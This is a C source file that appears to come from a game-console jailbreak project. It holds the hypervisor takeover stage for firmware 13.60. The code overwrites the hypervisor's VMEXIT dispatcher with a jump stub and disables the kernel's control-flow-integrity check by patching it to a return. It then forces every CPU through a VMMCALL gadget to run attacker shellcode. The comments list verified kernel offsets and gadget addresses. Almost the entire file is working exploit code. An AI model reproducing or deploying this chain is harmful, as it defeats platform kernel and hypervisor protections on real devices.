/*
 * Post-resume hypervisor takeover blob (runs on the BSP in kernel context).
 *
 * Entered after resume via a khook resume_rip redirect installed on
 * SYS_GETUID. Arguments:
 *   rdi = kernel text base (ktext)
 *   rsi = direct-map base (dmap, i.e. kdldmap(0))
 *
 * With NPT already disabled by the pre-suspend break_hv payload, the direct
 * map addresses HV physical memory. We patch the HV VMEXIT dispatcher so the
 * first VMMCALL hands control to shellcode_hv (running on the identity map),
 * disable the kernel CFI check, then force every logical CPU through a
 * rendezvous whose action callback is a bare VMMCALL. This blob never
 * returns.
 */
#include <stdint.h>

/* The hypervisor's VMEXIT dispatcher. 0x62846C00 was another 13.20 value; the
 * 13.60 one is 0x6283D800, which off_1360 records as hardware-verified - the
 * code at that address is `mov edx,0xcfc ; in eax,dx`. Patching the wrong
 * address means the takeover rewrites something else in hypervisor memory, or
 * nothing at all, and then the VMMCALL never reaches shellcode_hv. */
#define HV_HANDLE_VMEXIT_PA   0x6283D800ULL

#define CAVE_HV_PAGING        0x100000000ULL
#define CAVE_HV_CODE          0x100003000ULL

/* Kernel offsets. These were all carried over from a 13.20 table and every one
 * of them was wrong for 13.60, which is what made the kernel die a few seconds
 * after it started: the blob patched an arbitrary .text address and then called
 * smp_rendezvous at an address that is the middle of some other function.
 *
 * Checked against this console's own 13.60 kernel, the way
 * tools/verify-offsets.py now re-checks them:
 *
 *   0x44F8C0  KERNEL_CFI_CHECK, confirmed as a function start
 *   0xB03BA0  FUN_SMP_RENDEZVOUS, confirmed as a function start
 *   0x2912A2  a bare `ret` (the table's GAD_RET_TRAMP); 0x291232 was not one
 *   0xC16A19  a real `vmmcall`, followed by `pop rbp; ret`. The old 0xc09e49 was
 *             in the same region of hypervisor code but shifted - the instruction
 *             there is not a vmmcall at all. */
#define OFF_KERNEL_CFI_CHECK  0x44F8C0ULL
#define OFF_FUN_SMP_RENDEZVOUS 0xB03BA0ULL

#define OFF_GADGET_RET        0x2912A2ULL   /* bare `ret` */
#define OFF_GADGET_VMMCALL    0xC16A19ULL   /* `vmmcall` (tail never runs) */

/* mp3_initialize(0) - "initialize hdcp in mp3". The only one of the four
 * bring-up calls upstream makes whose offset this port has;
 * dp_enable_link_phy needs FUN_TRANSMITTER_CONTROL and the other two need
 * FUN_MP3_INVOKE, neither of which is known for 13.60. It is attempted here
 * because this code still runs on the kernel's own page tables, which is the
 * only context in which a kernel function can be called at all. */
#define OFF_FUN_MP3_INITIALIZE 0xA13740ULL

__attribute__((section(".entry_point"), noreturn))
void takeover(uint64_t ktext, uint64_t dmap)
{
  volatile uint8_t *vme = (volatile uint8_t *)(uintptr_t)(dmap + HV_HANDLE_VMEXIT_PA);

  /* movabs rax, CAVE_HV_PAGING ; mov cr3, rax ; movabs rax, CAVE_HV_CODE ; jmp rax */
  uint8_t stub[25];
  stub[0]  = 0x48;
  stub[1]  = 0xb8;
  *(uint64_t *)(void *)&stub[2]  = CAVE_HV_PAGING;
  stub[10] = 0x0f;
  stub[11] = 0x22;
  stub[12] = 0xd8;
  stub[13] = 0x48;
  stub[14] = 0xb8;
  *(uint64_t *)(void *)&stub[15] = CAVE_HV_CODE;
  stub[23] = 0xff;
  stub[24] = 0xe0;

  for (int i = 0; i < 25; i++)
    vme[i] = stub[i];

  /* Bring the MP3 block up the way upstream does before handing over. Done after
   * the VMEXIT stub is in place but before the rendezvous, while the kernel's
   * page tables are still loaded - shellcode_hv runs identity-mapped and cannot
   * call kernel code at all. */
  {
    int (*mp3_initialize)(int) =
        (int (*)(int))(uintptr_t)(ktext + OFF_FUN_MP3_INITIALIZE);
    mp3_initialize(0);
  }

  /* Disable the kernel CFI check so the raw function-pointer callbacks pass. */
  *(volatile uint8_t *)(uintptr_t)(ktext + OFF_KERNEL_CFI_CHECK) = 0xc3;

  /* Kick every CPU into a raw VMMCALL; each VMEXIT lands in shellcode_hv. */
  void (*smp_rendezvous)(void *, void *, void *, void *) =
      (void (*)(void *, void *, void *, void *))(uintptr_t)(ktext + OFF_FUN_SMP_RENDEZVOUS);
  smp_rendezvous((void *)(uintptr_t)(ktext + OFF_GADGET_RET),
                 (void *)(uintptr_t)(ktext + OFF_GADGET_VMMCALL),
                 (void *)(uintptr_t)(ktext + OFF_GADGET_RET), 0);

  for (;;)
    ;
}
